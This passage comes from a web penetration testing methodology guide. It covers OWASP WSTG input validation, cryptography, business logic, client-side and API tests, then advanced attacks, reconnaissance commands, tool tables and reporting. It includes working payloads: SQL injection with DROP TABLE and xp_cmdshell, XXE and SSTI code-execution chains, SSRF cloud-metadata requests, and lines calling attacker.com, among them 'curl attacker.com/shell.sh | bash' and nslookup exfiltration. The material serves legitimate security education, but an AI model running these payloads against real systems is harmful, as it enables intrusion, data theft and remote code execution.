Test alternate HTTP methods on restricted endpoints (PUT, DELETE, PATCH, HEAD instead of POST). Try arbitrary methods. Test verb-based authentication bypass (GET to admin-only POST endpoint).

#### WSTG-INPV-04: HTTP Parameter Pollution
Send duplicate parameters: `?param=value1&param=value2`. Test array notation: `param[]=value1&param[]=value2`. Test different backend parsing (last value wins vs array). Use HPP to bypass WAF rules.

#### WSTG-INPV-05: SQL Injection
**Detection**: `'`, `"`, `\`, `)`, `;--`, `' OR '1'='1`, `' AND '1'='2`. Time-based: `' OR SLEEP(5)--`, `'; WAITFOR DELAY '0:0:5'--`.  
**Error-based**: Force type conversion errors, duplicate column errors.  
**Union-based**: Find column count with ORDER BY, test UNION SELECT null,null,null.  
**Blind boolean**: `' AND 1=1--` vs `' AND 1=2--` (response difference).  
**Blind time-based**: `' AND IF(1=1,SLEEP(5),0)--` (timing difference).  
**Stacked queries**: `'; DROP TABLE users--`, `'; EXEC xp_cmdshell('whoami')--`.  
**Out-of-band**: DNS/HTTP exfiltration for blind scenarios.

**DB-Specific Techniques**:
- **WSTG-INPV-05.1 Oracle**: DBMS_PIPE (timing), UTL_HTTP (OOB), CTXSYS.DRITHSX.SN
- **WSTG-INPV-05.2 MySQL**: INTO OUTFILE (file write), LOAD_FILE (file read), BENCHMARK/SLEEP (timing), information_schema
- **WSTG-INPV-05.3 SQL Server**: xp_cmdshell (RCE), OPENROWSET, WAITFOR DELAY, DB_NAME(), sp_executesql
- **WSTG-INPV-05.4 PostgreSQL**: pg_sleep(), COPY (file read/write), lo_import, dblink, information_schema
- **WSTG-INPV-05.5 MS Access**: Wildcard-based injection, UNION variations, MSysObjects system tables
- **WSTG-INPV-05.6 NoSQL Injection**: MongoDB `$ne`/`$gt`/`$regex`/`$where`, CouchDB views, Redis commands
- **WSTG-INPV-05.7 ORM Injection**: HQL injection, Django ORM bypass, Sequelize injection, raw query helpers
- **WSTG-INPV-05.8 Client-side SQL**: WebSQL/IndexedDB injection via client-side queries

**Tools**: sqlmap, ghauri, NoSQLMap, BBQSQL

#### WSTG-INPV-06: LDAP Injection
Payloads: `*`, `*)(uid=*))`, `*)(|(uid=*))`, `admin*)(uid=*`. Boolean oracle: `(objectClass=*)` vs `(objectClass=notexist)`. LDAP is commonly the auth backend for enterprise apps.

#### WSTG-INPV-07: XML Injection
Test XML tag injection, CDATA manipulation, entity injection. Key: XXE — `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`. Test for Billion Laughs DoS.

#### WSTG-INPV-08: SSI Injection
Test for Server-Side Includes: `<!--#exec cmd="id"-->`, `<!--#include file="/etc/passwd"-->`, `<!--#echo var="DOCUMENT_ROOT"-->`, `<!--#printenv-->`.

#### WSTG-INPV-09: XPath Injection
Similar to SQLi but targeting XML: `' or '1'='1`, `' or true() or '`. Blind extraction: `string-length(name(/*))=9`, `starts-with(name(/*),'d')`.

#### WSTG-INPV-10: IMAP/SMTP Injection
Test header injection via CRLF in email fields. IMAP command injection in mailbox name parameters. SMTP relay testing.

#### WSTG-INPV-11: Code Injection
Test eval()/assert()/system() injection points. 
- **WSTG-INPV-11.1 LFI**: `../../../etc/passwd`, null byte, path truncation, log file poisoning, /proc/self/environ, php://filter chains, expect:// wrapper
- **WSTG-INPV-11.2 RFI**: `http://attacker.com/shell.txt`, SMB share inclusion, data:// wrapper

#### WSTG-INPV-12: Command Injection
Payloads: `; id`, `| id`, `` `id` ``, `$(id)`, `&& id`, `|| id`, `%0a id` (newline). Blind time-based: `; sleep 5`. OOB exfiltration: `; nslookup $(whoami).attacker.com`.

#### WSTG-INPV-13: Format String Injection
Test for printf-family function vulnerabilities: `%s%s%s%s`, `%x%x%x%x`, `%n%n%n%n`.

#### WSTG-INPV-14: Incubated Vulnerability
Test for multi-stage attack chains: stored XSS → CSRF → privilege escalation, file upload → LFI → RCE.

#### WSTG-INPV-15: HTTP Splitting/Smuggling
**HTTP Splitting**: Inject CRLF (`%0d%0a`) into header values (Location, Set-Cookie).
**HTTP Smuggling**: CL.TE (Content-Length front, Transfer-Encoding back), TE.CL, TE.TE, H2.CL, H2.TE variants. Tools: h2smuggler, Burp HTTP Request Smuggler extension.

#### WSTG-INPV-16: HTTP Incoming Requests
Test header size limits, method restrictions, Content-Type validation, request body size limits.

#### WSTG-INPV-17: Host Header Injection
Test password reset poisoning: `Host: attacker.com`. Cache poisoning via Host header. Routing bypass and SSRF via Host manipulation. Use alternate headers: X-Forwarded-Host, X-Host, X-Forwarded-Server.

#### WSTG-INPV-18: Server-side Template Injection (SSTI)
**Detection**: Inject `${7*7}`, `{{7*7}}`, `<%= 7*7 %>` to detect template engine.
**Engine fingerprinting table**:
- Jinja2 (Python): `{{7*7}}` → 49, `{{7*'7'}}` → 7777777
- Twig (PHP): `{{7*7}}` → 49, `{{_self.env.registerUndefinedFilterCallback("system")}}`
- FreeMarker (Java): `${7*7}` → 49, `${"freemarker.template.utility.Execute"?new()("id")}`
- Velocity (Java): `#set($x=7*7)$x`
- Smarty (PHP): `{php}echo 7*7;{/php}`
- ERB (Ruby): `<%= 7*7 %>`, `<%= system('id') %>`
- Mako (Python): `${7*7}`
- Thymeleaf: `[[${7*7}]]`
- EJS (Node): `<%= 7*7 %>`, `<%= global.process.mainModule.require('child_process').execSync('id') %>`
- Pebble (Java): `{{ 7*7 }}`
- Pug/Jade: `#{7*7}`
- Nunjucks: `{{7*7}}`

**Jinja2 RCE chain**: `{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}`
**Tools**: SSTImap, tplmap, PayloadsAllTheThings SSTI section

#### WSTG-INPV-19: Server-Side Request Forgery (SSRF)
Test all URL/redirect/fetch parameters. Internal port scanning: `http://localhost:22`, `http://127.0.0.1:8080`. Cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/` (GCP), `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (Azure). Protocol smuggling: `file:///etc/passwd`, `gopher://`, `dict://`. Blind SSRF: DNS/HTTP callbacks to controlled server.
**Tools**: SSRFmap, Burp Collaborator, interactsh

---

### 8.8 Error Handling (WSTG-ERRH)

#### WSTG-ERRH-01: Improper Error Handling
Force errors: invalid input types, boundary values, null bytes, oversized input. Check for verbose error messages exposing stack traces, SQL errors, file paths, framework versions. Test for different error codes (400, 403, 404, 405, 500, 502) revealing information.

#### WSTG-ERRH-02: Stack Traces
Trigger application exceptions and check for full stack traces in responses. Common triggers: invalid parameters, missing parameters, type mismatches, null pointer exceptions. Check error responses from all entry points (web, API, mobile).

---

### 8.9 Weak Cryptography (WSTG-CRYP)

#### WSTG-CRYP-01: Weak Transport Layer Security
Test for TLS 1.0/1.1 support. Check cipher suite strength (avoid RC4, 3DES, NULL ciphers, export-grade ciphers). Verify certificate validity, chain, and hostname matching. Test for HSTS implementation. Check for mixed content on HTTPS pages. Tools: testssl.sh, sslyze, sslscan, SSL Labs.

#### WSTG-CRYP-02: Padding Oracle
Test encrypted cookies/tokens/parameters for CBC padding oracle vulnerability. Send modified ciphertext and observe error responses for padding errors vs. decryption errors.
**Tools**: PadBuster, python-padding-oracle, Burp Suite

#### WSTG-CRYP-03: Unencrypted Channels
Check for sensitive data transmitted over HTTP (not HTTPS). Test login forms, registration, password reset, payment pages. Check API endpoints for HTTPS enforcement. Check WebSocket for ws:// instead of wss://.

#### WSTG-CRYP-04: Weak Encryption
Identify ECB mode encryption (identical plaintext blocks produce identical ciphertext blocks). Test for static/weak IVs. Check for hardcoded keys in source code. Test for weak algorithms: DES, RC4, MD5 for signatures, SHA1 for password hashing. Verify key derivation uses PBKDF2/bcrypt/scrypt/argon2.

---

### 8.10 Business Logic Testing (WSTG-BUSL)

#### WSTG-BUSL-00: Introduction to Business Logic
Understand application business flows. Identify assumptions developers made. Create abuse cases for each assumption. Map trust boundaries where client controls data that affects business decisions.

#### WSTG-BUSL-01: Business Logic Data Validation
Test negative quantities, zero values, extremely large values. String in numeric fields. Date boundary manipulation. Special characters in business fields.

#### WSTG-BUSL-02: Forge Requests
Parameter tampering for price/quantity/discount. Replay attacks on transactions. Duplicate transaction submission. Modify hidden fields affecting business logic.

#### WSTG-BUSL-03: Integrity Checks
Checksum bypass on client-submitted data. Signed data modification. MAC/token validation bypass. Test if server re-validates client-provided integrity values.

#### WSTG-BUSL-04: Process Timing
Race conditions (TOCTOU — Time of Check, Time of Use). Parallel request submission for duplicate actions. Promotional period/time-window bypass. Test for single-packet race conditions using HTTP/2 multiplexing (Turbo Intruder).

#### WSTG-BUSL-05: Function Limits
Voucher/coupon reuse beyond allowed count. Rate limit bypass. Quota bypass. Free trial abuse (multiple accounts, time manipulation). Referral bonus abuse.

#### WSTG-BUSL-06: Circumvention of Work Flows
Skip steps in multi-step processes (direct URL access). Jump to final state. Back-button abuse to repeat steps. Out-of-order execution. Modify step indicators in requests.

#### WSTG-BUSL-07: Defenses Against Application Misuse
Automation detection bypass. Bot mitigation testing. Mass action abuse (bulk operations). Test CAPTCHA/rate-limiting bypass.

#### WSTG-BUSL-08: Upload Unexpected File Types
MIME type bypass. Magic byte manipulation. Extension blacklist bypass (.php5, .phtml, .shtml, .php.). Test double extensions (file.php.jpg). Null byte injection in filename.

#### WSTG-BUSL-09: Upload Malicious Files
Polyglot files (valid image + PHP code). SVG with embedded XSS/XXE. HTML smuggling via file upload. EICAR test file for AV detection. Server-side content-type verification bypass.

---

### 8.11 Client-side Testing (WSTG-CLNT)

#### WSTG-CLNT-01: DOM-Based XSS
Identify sources (document.URL, location.hash, document.referrer) and sinks (innerHTML, document.write, eval, setTimeout). Use Burp DOM Invader. Test URL fragment injection. postMessage-based XSS. DOM clobbering techniques.

#### WSTG-CLNT-02: JavaScript Execution
Test for eval(), Function() constructor, setTimeout/setInterval with string arguments. Script injection via innerHTML, outerHTML, document.write. Check for script gadgets in framework code.

#### WSTG-CLNT-03: HTML Injection
Test reflected and stored HTML injection. Iframe injection. Form hijacking via injected HTML. Test for sanitization bypass in HTML filtering.

#### WSTG-CLNT-04: Client-side URL Redirect
Test for open redirect in JavaScript: location.href = user_input, window.open(user_input). DOM-based redirects via tainted sources. Test for javascript: protocol URLs.

#### WSTG-CLNT-05: CSS Injection
Test for attribute selectors leaking data, @import for SSRF via CSS. CSS keylogger via background-image URL. Style injection into other users' views.

#### WSTG-CLNT-06: Client-side Resource Manipulation
Local file access via file:// protocol. Blob URL manipulation. Data URI abuse (data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==).

#### WSTG-CLNT-07: Cross Origin Resource Sharing (CORS)
Test for Access-Control-Allow-Origin: * with credentials. Null origin allowed. Pre-domain wildcard matching (example.com.evil.com). Reflected Origin header. Test Vary: Origin header behavior.

#### WSTG-CLNT-08: Cross Site Flashing
Test Flash security settings. Check crossdomain.xml for wildcard allow-access-from. Test ExternalInterface calls. AS3 injection vectors.

#### WSTG-CLNT-09: Clickjacking
Check for missing X-Frame-Options header. Test CSP frame-ancestors directive. Framebusting code bypass. Double-clickjacking. Multi-step clickjacking.

#### WSTG-CLNT-10: WebSockets
Test ws:// vs wss://. Origin validation during handshake. Frame-based attacks. Data tampering in WebSocket messages. DoS via flooding. Message injection (XSS, SQLi through WS).

#### WSTG-CLNT-11: Web Messaging
Test postMessage origin validation. Wildcard targetOrigin (*). Event listener XSS via received messages. Check message validation at receiver side.

#### WSTG-CLNT-12: Browser Storage
Check for sensitive data in localStorage/sessionStorage. IndexedDB exposure analysis. Compare cookie security vs Storage API for token storage.

#### WSTG-CLNT-13: Cross Site Script Inclusion (XSSI)
JSONP callback injection. Script tag with attacker-controlled src. Sensitive data leakage via JSONP endpoints. Dynamic script inclusion vulnerabilities.

---

### 8.12 API Testing (WSTG-APIT)

#### WSTG-APIT-01: GraphQL Testing
**Introspection query**: `{ __schema { types { name fields { name type { name kind } } } } }`. If disabled, use **Clairvoyance** for schema reconstruction via field suggestions.
**Batching attacks**: Alias-based queries to bypass rate limits (500 aliases in one request).
**Depth attacks**: Deeply nested queries exploiting circular relationships.
**Field-level authorization**: Check per-field authorization enforcement.
**IDOR in GraphQL**: Access other users' data through nested queries.
**Tools**: InQL (Burp), Clairvoyance, BatchQL, GraphQL Voyager, graphql-cop, graphw00f.

---

## Part 9: Advanced Modern Vulnerability Categories

### 9.1 Prototype Pollution
**Detection**: Inject `__proto__` payloads via JSON body/URL params — `{"__proto__":{"polluted":"yes"}}`, `{"constructor":{"prototype":{"polluted":"yes"}}}`.
**Client-side exploitation**: Pollute property read by DOM sink → DOM XSS.
**Server-side exploitation (Node.js)**: Pollute `NODE_OPTIONS` → `--require /path/to/malicious.js` → RCE on child_process.spawn.
**Gadget chains**: ejs `outputFunctionName`, lodash `.template()` `variable`, Handlebars AST injection.
**Tools**: Burp DOM Invader, PPScan, ppmap.

### 9.2 Deserialization Attacks
| Language | Magic Bytes/Signature | Tool | Key Gadget Chains |
|----------|----------------------|------|-------------------|
| Java | `AC ED 00 05` (hex), `rO0A` (base64) | ysoserial | CommonsCollections1-7, Spring, Groovy, Jdk7u21 |
| PHP | `O:4:"User":...` | PHPGGC | Monolog, Laravel, Symfony, WordPress, Guzzle, SwiftMailer |
| Python | `\x80\x04` (pickle) | pickletools | `__reduce__` → `os.system()` |
| Ruby | Marshal format | universal_gadget_chain | Rails/Devise chains |
| .NET | BinaryFormatter | ysoserial.net | TypeConfuseDelegate, ActivitySurrogateSelector |
**Java**: `java -jar ysoserial.jar CommonsCollections5 'curl attacker.com/shell.sh | bash'`
**PHP**: `php phpggc.php monolog/rce1 'system("id")'` (use -f for fast-destruct, -n for regex bypass)
**Python**: `class RCE: __reduce__ = lambda self: (os.system, ('id',))`

### 9.3 JWT Attacks
| Attack | Tool/Technique | Payload |
|--------|---------------|---------|
| alg:none | Set `"alg":"none"`, strip signature | Try case variants: `None`, `NONE`, `nOnE` |
| RS256→HS256 | jwt_tool -X k | Switch to HS256, sign with public key as HMAC secret |
| JWK injection | jwt_tool -X j | Embed attacker RSA public key in `jwk` header |
| JKU injection | jwt_tool -X i | Point `jku` at attacker JWKS endpoint → SSRF + sig bypass |
| kid path traversal | `"kid":"../../dev/null"` | Sign with empty secret (HS256) |
| kid SQL injection | `"kid":"x' UNION SELECT 'secret'-- -"` | Extract signing key from DB |
| Weak HMAC | hashcat -m 16500 | Crack HS256/HS384/HS512 secrets |
**Tools**: jwt_tool, jwt-cracker, Burp JWT Editor

### 9.4 OAuth 2.0 Attacks
1. **Missing `state` parameter** → CSRF on auth flow
2. **Open redirect via `redirect_uri`** → MUST use exact-match, not prefix/wildcard
3. **Missing PKCE** → Authorization code interception (mandatory in OAuth 2.1)
4. **Improper ID Token validation** → Check iss, aud (must contain client_id), exp, nonce
5. **`iss`+`sub` confusion across IdPs** → Store iss+sub combination, not sub alone
6. **`redirect_uri` path traversal** → Prefix matching + open redirect chain = token theft
7. **Fragment-based token leakage** → Referer header exposes tokens from implicit grant
8. **response_type manipulation** → Switch `code` to `id_token token`
9. **Ghost-token / audience injection** → Client signs JWT for AS1, replays at AS2
10. **OIDC discovery poisoning** → X-Forwarded-Host unvalidated → attacker JWKS URI

### 9.5 Web Cache Poisoning & Deception
**Cache Poisoning**: Find unkeyed inputs (headers/params cache ignores but origin reads). Inject malicious value reflected in response → cache serves to all users. Unkeyed vectors: X-Forwarded-Host, X-Forwarded-Proto, custom headers, specific query params.
**CPDoS (Cache Poisoned DoS)**: Poison cache with error response → all users get error.
**Cache Deception**: Trick cache into storing authenticated response as static file: `/account/profile.css` → cache sees .css → stores response → attacker retrieves without auth.
**Tools**: Burp Param Miner, Burp Collaborator

### 9.6 Race Conditions
**Single-Packet Attack (HTTP/2)**: Send 20-30 requests in one TCP packet via HTTP/2 multiplexing.
**Turbo Intruder template**:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
    for i in range(20): engine.queue(target.req, gate='race1')
    engine.openGate('race1')
```
**Common targets**: Coupon/Referral codes, OTP brute-force bypass, voting, account creation, limited-stock purchases.

### 9.7 HTTP Request Smuggling
| Variant | Front-end | Back-end | Payload Strategy |
|---------|-----------|----------|-----------------|
| CL.TE | Content-Length | Transfer-Encoding | Front uses CL, back parses chunked |
| TE.CL | Transfer-Encoding | Content-Length | Front uses chunked, back uses CL |
| TE.TE | Transfer-Encoding | Transfer-Encoding | Obfuscate TE header for parsing difference |
| H2.CL | HTTP/2 frame | Content-Length (downgraded) | Inject content-length header in H2 frames |
| H2.TE | HTTP/2 frame | Transfer-Encoding (downgraded) | Inject transfer-encoding in H2 headers |
**Durable fix**: End-to-end HTTP/2 (no downgrade). Tools: h2smuggler, Burp HTTP Request Smuggler.

### 9.8 NoSQL Injection
**Operator injection (MongoDB)**:
```json
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$gt": ""}}
```
**$where JavaScript injection**: `{"$where": "sleep(5000)"}` — 5 second delay confirms JS execution.
**Blind extraction**: `{"username": "admin", "password": {"$regex": "^a"}}` — boolean-based character extraction.

### 9.9 Second-Order SQL Injection & ORM Injection
Payload stored safely (parameterized), later retrieved and concatenated unsafely into different query. Lives in stored procedures, ORM raw queries, admin panels, background jobs.
**ORM Escape Hatches**: Hibernate HQL, Django .raw()/.extra(), Rails string interpolation, Sequelize .literal(), Knex whereRaw(), Prisma $queryRawUnsafe.

---

## Part 10: Reconnaissance Deep Dive (5 Tiers)

### Tier 1 — Passive Reconnaissance
```
subfinder -d example.com | assetfinder --subs-only example.com
amass enum -passive -d example.com
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u
theHarvester -d example.com -b all
shodan search org:"Example Corp"
```
**Google dorks**: `site:*.example.com -www`, `site:example.com filetype:env`, `site:example.com inurl:admin`
**GitHub**: Search for `"example.com" password OR secret OR api_key`

### Tier 2 — Active Surface Expansion
```
# DNS resolution
dnsx -l subs.txt -silent | tee resolved.txt
# HTTP probing with tech detection
httpx -l resolved.txt -status-code -title -tech-detect -cdn -o live.json
# Port scanning top 1000 ports
naabu -host target.com -top-ports 1000 | nmap -sV -iL -
# Screenshots
gowitness file -f live_subs.txt
# Virtual host brute-force
ffuf -w vhosts.txt -u https://target.com -H "Host: FUZZ.example.com" -fc 200
# Subdomain takeover
nuclei -t ~/nuclei-templates/http/takeovers/ -l live_subs.txt
```

### Tier 3 — Deep Surface Intelligence
```
# JS endpoint extraction
katana -u https://target.com -jc -d 3 | grep '.js$' > js.txt
cat js.txt | while read url; do curl -s "$url"; done > all.js
jsluice -r all.js > endpoints.json
LinkFinder -i all.js -o links.html
# Source maps
cat js.txt | sed 's/$/.map/' | httpx -silent -o smaps.txt
# Secrets
trufflehog filesystem ./js_dumps/
# Parameter mining
gau target.com | gf interesting-params | sort -u
arjun -u https://target.com/api/endpoint
# GraphQL detection
gau target.com | grep -i 'graphql'
# CORS
nuclei -t ~/nuclei-templates/http/cors/ -l live.txt
# Cloud buckets
cloud_enum -k example.com
s3scanner scan --buckets bucket-list.txt
```

### Tier 4 — Automation & Monitoring
```
# Nuclei sweep
nuclei -l live.txt -severity critical,high,medium -o nuclei_results.txt
# gf patterns for vulnerability classes
gau target.com | gf xss | sort -u > xss_targets.txt
gau target.com | gf sqli | sort -u > sqli_targets.txt
gau target.com | gf ssrf | sort -u > ssrf_targets.txt
# Change monitoring
while true; do
    subfinder -d example.com -silent | anew subs.txt
    sleep 3600
done
```

### Tier 5 — Strategy & Prioritization
- Prioritize high-value assets (auth systems, payment, admin)
- Cross-reference findings across tools for confirmation
- Document anomalies even if not yet exploitable
- Build target-specific wordlists from discovered patterns
- Create handoff package for team collaboration

---

## Part 11: Complete Tools Reference

### Reconnaissance & OSINT
| Tool | Purpose |
|------|---------|
| subfinder | Passive subdomain enumeration (30+ sources) |
| amass | Deep OSINT enumeration with graph storage |
| assetfinder | Quick subdomain discovery from multiple sources |
| chaos | ProjectDiscovery curated dataset |
| massdns | High-performance bulk DNS resolver |
| puredns | Mass DNS resolver with wildcard filtering |
| shuffledns | Bulk DNS resolver with permutation support |
| dnsx | Multi-purpose DNS toolkit |
| alterx | Subdomain permutation generator |
| dnsgen | Dictionary-based subdomain permutations |
| gotator | Token-based subdomain permutations |
| httpx | HTTP probing with tech detection + fingerprinting |
| httprobe | Simple HTTP/HTTPS probe |
| gau | Get All URLs from Wayback/OTX/CommonCrawl |
| waybackurls | Wayback Machine URL scraper |
| katana | Fast headless web crawler |
| hakrawler | Lightweight web crawler |
| whatweb | Deep web technology fingerprinting |
| wappalyzer | Browser-based tech stack detection |
| wafw00f | WAF detection and fingerprinting |
| theHarvester | Email, subdomain, and OSINT collection |
| SpiderFoot | Automated OSINT (200+ modules) |
| Maltego | Visual OSINT with 400+ transforms |
| Sherlock | Username profiling across 400+ platforms |
| Shodan | Internet-connected device search engine |
| Censys | Certificate and host discovery |

### Content & Fuzzing
| Tool | Purpose |
|------|---------|
| ffuf | Universal HTTP fuzzer (directory, vhost, params, headers) |
| feroxbuster | Recursive content discovery with smart filtering |
| gobuster | Fast directory/DNS/vhost/S3 enumeration |
| dirsearch | Beginner-friendly directory brute-forcer |
| wfuzz | Highly configurable web fuzzer |
| arjun | HTTP parameter discovery |
| paramspider | Parameter extraction from web archives |
| x8 | Hidden parameter enumeration |
| gf | Grep-based URL pattern matching by vuln type |

### JS Analysis & Secrets
| Tool | Purpose |
|------|---------|
| LinkFinder | Endpoint extraction from JavaScript files |
| jsluice | Modern JS analysis pipeline (Go) |
| SecretFinder | API key and secret detection in JS |
| xnLinkFinder | Enhanced LinkFinder with more output formats |
| trufflehog | Git repository secret scanning |
| gitleaks | Git history secret auditing |
| getJS | Fast JS file collection from page source |
| subjs | JS file URL extraction |

### Vulnerability Scanning
| Tool | Purpose |
|------|---------|
| nuclei | Template-based vulnerability scanner (community + custom) |
| nikto | Classic web server scanner |
| wpscan | WordPress vulnerability scanner |
| joomscan | Joomla vulnerability scanner |
| droopescan | Drupal/SilverStripe/WordPress scanner |
| nmap | Network mapper with NSE scripts |

### Proxy & Interception
| Tool | Purpose |
|------|---------|
| Burp Suite Pro | Industry standard web testing proxy ($499/yr) |
| OWASP ZAP | Free, open-source Burp alternative with automation |
| Caido | Modern Rust-based web testing proxy |
| mitmproxy | Scriptable man-in-the-middle proxy |
| Fiddler | Web debugging proxy |

### Injection Tools
| Tool | Target |
|------|--------|
| sqlmap | SQL injection (all DB types, all techniques) |
| ghauri | SQL injection (2-5x faster than sqlmap, better WAF bypass) |
| NoSQLMap | MongoDB/CouchDB injection |
| BBQSQL | Blind SQL injection via binary search |
| XSStrike | XSS detection with context-aware payload generation |
| dalfox | Fast XSS scanner with headless verification |
| kxss/Gxss | Parameter reflection detector (pre-filter for XSS) |
| SSTImap | Template injection detection + RCE (15+ engines) |
| tplmap | Classic SSTI exploitation tool |
| commix | Automated OS command injection exploitation |
| LFImap | Modern LFI discovery and exploitation |
| LFISuite | Classic LFI tool with pseudo-shell |
| SSRFmap | SSRF exploitation framework with modules |
| XXExploiter | XXE payload generator with DTD server |

### JWT & Authentication
| Tool | Purpose |
|------|---------|
| jwt_tool | Complete JWT attack suite (8 attack classes) |
| hydra | Multi-protocol online brute-forcer (50+ protocols) |
| medusa | Parallel multi-protocol brute-forcer |
| hashcat | GPU-accelerated hash cracking |
| John the Ripper | CPU-based hash cracking with auto-detect |

### API & GraphQL
| Tool | Purpose |
|------|---------|
| Postman | API testing platform with collection runner |
| Insomnia | Lightweight REST/GraphQL client |
| InQL | Burp extension for GraphQL security testing |
| Clairvoyance | GraphQL schema reconstruction without introspection |
| BatchQL | GraphQL batching attack tool |
| GraphQL Voyager | Schema visualization tool |
| graphql-cop | GraphQL security auditor |
| graphw00f | GraphQL engine fingerprinting |

### Cloud Security
| Tool | Purpose |
|------|---------|
| Prowler | Multi-cloud security auditor (572+ checks, CIS/NIST/GDPR) |
| Pacu | AWS exploitation framework |
| CloudFox | AWS/Azure attack surface mapping |
| S3Scanner | S3 bucket enumeration |
| cloud_enum | Multi-cloud asset enumeration |
| ScoutSuite | Multi-cloud security auditor (deprecated, use Prowler) |

### Mobile Security
| Tool | Purpose |
|------|---------|
| MobSF | All-in-one mobile app static + dynamic analysis |
| Frida | Dynamic instrumentation toolkit |
| Objection | Runtime mobile exploration based on Frida |
| jadx | DEX to Java decompiler |
| apktool | APK reverse engineering |

### Exploitation & Post-Exploitation
| Tool | Purpose |
|------|---------|
| Metasploit | Full exploitation framework (2300+ modules) |
| BeEF | Browser exploitation framework (300+ commands) |
| Sliver | Open-source C2 framework (HTTP/DNS/mTLS) |
| Empire | Post-exploitation framework (PowerShell/Python) |
| Havoc | Modern C2 with collaborative UI |
| Mythic | Extensible C2 framework |

### Wordlists & Payloads
| Resource | Content |
|----------|---------|
| SecLists | 6200+ wordlists (discovery, fuzzing, passwords, usernames, shells) |
| PayloadsAllTheThings | 50+ vulnerability categories with payloads for each |
| Assetnote Wordlists | Auto-generated content discovery wordlists (monthly updates) |
| FuzzDB | Web fuzzing payloads |
| rockyou.txt | 14.4M leaked passwords for hash cracking |
| OneListForAll | Combined content discovery wordlist |
| six2dez wordlist | Bug bounty optimized subdomain wordlist |

### Reporting
| Tool | Purpose |
|------|---------|
| Dradis | Collaborative pentest reporting |
| Faraday | Integrated pentest environment with reporting |
| CherryTree | Hierarchical note-taking with code blocks |
| Serpico | Security assessment report generator |

---

## Part 12: Wordlists & Payloads Reference

### SecLists Directory Structure
```
SecLists/
├── Discovery/
│   ├── DNS/              # Subdomain wordlists, zone transfer payloads
│   ├── Web-Content/      # Directory/file brute-force (common.txt, big.txt, raft-large-*)
│   └── Infrastructure/   # SNMP, IoT, services
├── Fuzzing/
│   ├── XSS/              # XSS payloads, polyglots
│   ├── SQLi/             # SQL injection payloads by DB type
│   ├── Command-Injection/ # OS command injection payloads
│   ├── LFI/              # Path traversal sequences
│   ├── SSTI/             # Template injection probes
│   └── SSRF/             # SSRF payloads
├── Passwords/
│   ├── Common-Credentials/ # Default vendor credentials
│   ├── Leaked-Databases/   # Real password leaks
│   └── Permutations/       # Rule-based password generation
├── Usernames/
├── Payloads/
├── Pattern-Matching/     # Regex for API keys, AWS keys, tokens
└── Web-Shells/           # PHP/ASP/JSP shells
```

### PayloadsAllTheThings Categories
Covers 50+ vulnerability types including: SQL Injection, NoSQL Injection, LDAP Injection, XSS, XXE, SSTI, SSRF, Command Injection, File Inclusion, File Upload, CSRF, CORS, JWT, OAuth, Deserialization, GraphQL, Race Condition, HTTP Smuggling, Prototype Pollution, WebSocket, XSSI, Web Cache Deception, Open Redirect, and more.

### Wordlist Usage Strategy by Phase
| Phase | Recommended Wordlist |
|-------|---------------------|
| Subdomain brute-force | six2dez curated list, combined_subdomains.txt |
| Directory brute-force | SecLists common.txt → raft-large-directories.txt |
| API endpoint discovery | SecLists raft-large-words.txt + Assetnote api routes |
| Parameter fuzzing | SecLists burp-parameter-names.txt |
| Password cracking | rockyou.txt + SecLists Common-Credentials/ |
| XSS payloads | PayloadsAllTheThings XSS + SecLists Fuzzing/XSS/ |
| SQL injection | PayloadsAllTheThings SQLi + SecLists Fuzzing/SQLi/ |

---

## Part 13: Reporting Methodology

### Report Structure
1. **Version Control**: Table with version, date, author, changes
2. **Table of Contents**: Full document navigation
3. **The Team**: Members with expertise and qualifications
4. **Scope**: Agreed boundaries and objectives
5. **Limitations**: Out-of-bounds areas, broken functionality, time/resource constraints
6. **Timeline**: Engagement duration and key dates
7. **Disclaimer**: Point-in-time assessment, no guarantee of completeness

### Executive Summary
- Objective of test in business context
- Key findings summarized for executives (business impact, not technical detail)
- Strategic recommendations (what to fix, not how)
- Risk posture overview (graphs/figures if helpful)

### Technical Findings
Each finding must include:
- **Reference ID**: For cross-reference (e.g., F-001, F-002)
- **Title**: [Vulnerability Type] in [Component] leading to [Impact]
- **Likelihood/Exploitability**: Easy/Moderate/Difficult/Very Difficult
- **Impact**: Critical/High/Medium/Low/Informational
- **Risk Level**: Combined likelihood + impact
- **CWE Mapping**: Root cause classification
- **CVSS Score** (optional): Use CVSS v4.0 calculator when required
- **Description**: What the vulnerability is, how it works
- **Reproduction Steps**: Exact copy-paste commands/requests
- **Evidence**: Screenshots, request/response captures
- **Remediation**: Specific, actionable fix guidance
- **References**: CVE, external resources, framework references

### Severity Rating Guidelines
| Severity | Definition | Example |
|----------|-----------|---------|
| **Critical** | Direct system compromise, full data access | SQLi → RCE, Auth bypass → admin access, SSRF → cloud metadata |
| **High** | Significant data exposure, privilege escalation | IDOR → PII access, Stored XSS → session hijacking, File upload → shell |
| **Medium** | Limited data exposure, configuration weaknesses | Reflected XSS (hard to exploit), Information disclosure, Missing security headers |
| **Low** | Minor issues, hardening opportunities | Cookie missing Secure flag on HTTPS-only site, Server version disclosure |
| **Informational** | No direct risk, notable for record | Interesting endpoint discovered, Technology fingerprinted |

### Appendices
- Test methodology used (reference frameworks)
- Severity and risk rating explanations
- Relevant tool output (cleaned, not raw dump)
- Complete test checklist (all WSTG test cases with pass/fail status)

---

## Part 14: Key Principles & Best Practices

### Testing Principles
1. **Get written authorization** before any testing
2. **Consistent methodology**: recon → map → discover → exploit → report
3. **Reproducibility**: Every finding must have clear, documented reproduction
4. **Root cause**: Identify underlying vulnerability, not just symptoms
5. **Coverage**: Test all roles, workflows, and components
6. **Safety**: Non-destructive where possible, rollback plans for destructive tests
7. **Framework alignment**: Map findings to OWASP Top 10, CWE, MITRE ATT&CK

### Execution Mode Distinctions
- **Penetration Testing** = Comprehensive coverage. Find ALL vulnerabilities in scope. Checklist-driven. Time-boxed. Scope-defined by contract.
